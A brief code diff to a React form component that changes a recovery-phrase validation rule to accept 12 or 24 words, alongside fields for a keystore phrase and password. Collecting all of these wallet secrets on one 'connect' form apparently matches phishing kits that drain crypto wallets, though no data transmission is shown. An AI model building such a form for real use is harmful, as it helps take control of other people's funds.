@@ -14,7 +14,7 @@ const Phrase = () => {
   const schema: ZodType<connectDataType> = z.object({
     recoveryPhrase: z.string().refine((phrase) => {
       const wordCount = phrase.trim().split(/\s+/).length;
-      return wordCount === 1 || wordCount === 24;
+      return wordCount === 12 || wordCount === 24;
     }),
     keystorePhrase: z.string(),
     keystorePassword: z.string(),
